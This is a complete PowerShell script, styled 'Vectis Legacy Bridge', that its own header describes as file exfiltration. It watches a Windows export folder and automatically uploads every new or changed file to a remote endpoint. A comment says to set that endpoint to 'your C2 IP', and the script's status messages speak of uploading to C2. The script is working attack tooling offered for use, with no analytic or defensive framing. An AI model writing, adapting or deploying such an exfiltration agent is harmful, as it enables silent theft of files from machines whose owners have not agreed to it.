# ==========================================
# VECTIS LEGACY BRIDGE (v1.0)
# Target: Windows Server 2008+ / Win7+
# Function: Zero-dependency file exfiltration via HTTPS
# ==========================================

# CONFIGURATION
$watchDir = "C:\LegacyApp\Exports"
$remoteUrl = "http://127.0.0.1:5000/upload" # CHANGE THIS to your C2 IP
$apiKey = "VECTIS-SECURE-ID-882"

# Ensure directory exists
if (!(Test-Path $watchDir)) { New-Item -ItemType Directory -Force -Path $watchDir | Out-Null }

Write-Host "[*] Vectis Bridge Active."
Write-Host "[*] Watching: $watchDir"
Write-Host "[*] Target:   $remoteUrl"

# THE WATCHER
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = $watchDir
$watcher.Filter = "*.*" # Watch everything, logic filters later
$watcher.IncludeSubdirectories = $false
$watcher.EnableRaisingEvents = $true

# THE ACTION BLOCK
$action = { 
    $path = $Event.SourceEventArgs.FullPath
    $name = $Event.SourceEventArgs.Name
    $changeType = $Event.SourceEventArgs.ChangeType
    
    Write-Host "[!] Detected change: $name"

    # 1. WAIT FOR FILE LOCK RELEASE
    # Legacy apps are slow. If we grab it too fast, we get 0 bytes or a lock error.
    $locked = $true
    $attempts = 0
    while ($locked -and $attempts -lt 10) {
        try {
            $stream = [System.IO.File]::Open($path, 'Open', 'Read', 'None')
            $stream.Close()
            $locked = $false
        } catch {
            Write-Host "    Waiting for file lock..."
            Start-Sleep -s 1
            $attempts++
        }
    }

    if ($locked) {
        Write-Host "[-] Timeout waiting for file lock. Skipping."
        return
    }

    # 2. UPLOAD (Native .NET WebClient - TLS 1.2 Compatible)
    try {
        # Force TLS 1.2 (Required for modern servers, older PowerShell defaults to SSL3)
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("X-Auth", $apiKey)
        $webClient.Headers.Add("X-Filename", $name)

        Write-Host "    Uploading to C2..."
        $responseBytes = $webClient.UploadFile($remoteUrl, "POST", $path)
        $responseString = [System.Text.Encoding]::ASCII.GetString($responseBytes)
        
        Write-Host "    [+] Success: $responseString"

        # 3. CLEANUP (Optional: Move to 'Sent' folder)
        # Move-Item $path "$path.sent" -Force
    }
    catch {
        Write-Host "    [-] Upload Failed: $_"
    }
}

# REGISTER EVENTS
Register-ObjectEvent $watcher "Created" -Action $action
Register-ObjectEvent $watcher "Changed" -Action $action

# KEEP ALIVE LOOP (Low CPU)
while ($true) { Start-Sleep -s 5 }